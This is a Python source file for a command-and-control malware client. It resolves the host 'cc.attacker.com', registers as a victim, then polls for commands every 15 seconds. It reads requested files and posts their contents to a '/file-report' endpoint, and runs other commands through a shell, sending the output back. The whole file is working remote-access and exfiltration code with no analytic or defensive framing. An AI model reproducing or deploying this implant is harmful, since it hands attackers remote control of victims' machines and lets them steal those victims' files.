import socket
import requests
import subprocess
import time
import re

cc_domain = 'cc.attacker.com'
victimID = None
proxy_port = 80

def resolve_domain(domain): 
    # Resolves a single domain to an IP address.
    
    try:
        result = socket.gethostbyname(domain)
        return result
    except Exception as e:
        print(f"[-] Failed to resolve {domain}: {e}")
    return None

def beacon(cnc_ip):
    # Sends a beacon to the C&C server. And receives allocated victimID

    try:
        response = requests.post(f"http://{cnc_ip}:{proxy_port}/beacon", data={"status": "online"})
        print(f"[+] Beacon sent to {cnc_ip}")
        global victimID 
        victimID = response.text.strip()
        print(f"[+] Allocated victim ID is {victimID}")
    except requests.exceptions.Timeout:
        print("[-] Beacon retrieval timed out.")
        return None
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error fetching beacon: {e}")
        return None
    except Exception as e:
        print(f"[-] Beacon failed: {e}")

def get_command(cnc_ip, victim_id):
    # Fetches a command from the C&C server

    try:
        response = requests.get(f"http://{cnc_ip}:{proxy_port}/get-command", params={"id": victim_id}, timeout=10)
        return response.text.strip()
    except requests.exceptions.Timeout:
        print("[-] Command retrieval timed out.")
        return None
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error fetching command: {e}")
        return None
    except Exception as e:
        print(f"[-] Error fetching command: {e}")
        return None

def send_output(cnc_ip, victim_id, output):
    # Sends general command output to the C&C server

    try:
        requests.post(f"http://{cnc_ip}:{proxy_port}/report", data={"id": victim_id, "output": output}, timeout=10)
        print(f"[+] General output sent to {cnc_ip}")
    except requests.exceptions.Timeout:
        print("[-] Report sending timed out.")
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error sending report: {e}")
    except Exception as e:
        print(f"[-] Error sending report: {e}")

def send_file_content(cnc_ip, victim_id, filename, content):
    # Sends file content to the C&C server's /file-report endpoint
    try:
        requests.post(f"http://{cnc_ip}:{proxy_port}/file-report",
                      data={"id": victim_id, "filename": filename, "content": content},
                      timeout=30) 
        print(f"[+] File '{filename}' content sent to {cnc_ip}")
    except requests.exceptions.Timeout:
        print(f"[-] File '{filename}' sending timed out.")
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error sending file '{filename}': {e}")
    except Exception as e:
        print(f"[-] Error sending file '{filename}': {e}")


def main():
    
    cnc_ip = None
    # Iterate through generated domains to find the C&C server
    
    cnc_ip = resolve_domain(cc_domain)
    if cnc_ip:
        print(f"[+] Resolved {cc_domain} to {cnc_ip}")

    
    else:
        print("[!] No C&C server found. Exiting.")
        return

    # Initial beacon to let C&C know we're online
    beacon(cnc_ip)

    while True:
        cmd = get_command(cnc_ip, victimID)
        if cmd:
            print(f"[+] Command received: {cmd}")

            
            if cmd.lower().startswith("read "):
                file_path = cmd[len("read "):].strip()
                if file_path:
                    try:
                        with open(file_path, 'r') as f:
                            file_content = f.read()
                        send_file_content(cnc_ip, victimID, file_path, file_content)
                    except FileNotFoundError:
                        send_output(cnc_ip, victimID, f"Error: File '{file_path}' not found.")
                    except PermissionError:
                        send_output(cnc_ip, victimID, f"Error: Permission denied to read '{file_path}'.")
                    except Exception as e:
                        send_output(cnc_ip, victimID, f"Error reading file '{file_path}': {str(e)}")
                else:
                    send_output(cnc_ip, victimID, "Error: 'read' command requires a file path.")
            

            elif re.match(r"^[a-zA-Z0-9 _\-\./]*$", cmd):
                try:
                    # Execute command and capture output
                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60) 
                    send_output(cnc_ip, victimID, result.decode('utf-8', errors='ignore'))
                except subprocess.TimeoutExpired:
                    send_output(cnc_ip, victimID, f"Command '{cmd}' timed out after 60 seconds.")
                except subprocess.CalledProcessError as e:
                    send_output(cnc_ip, victimID, f"Command '{cmd}' failed with error: {e.output.decode('utf-8', errors='ignore')}")
                except Exception as e:
                    send_output(cnc_ip, victimID, f"Error executing command '{cmd}': {str(e)}")
            else:
                send_output(cnc_ip, victimID, f"Invalid or disallowed command format: {cmd}")
        else:
            print("[*] No command received.")
        
        time.sleep(15) # Beacon interval

if __name__ == "__main__":
    main()
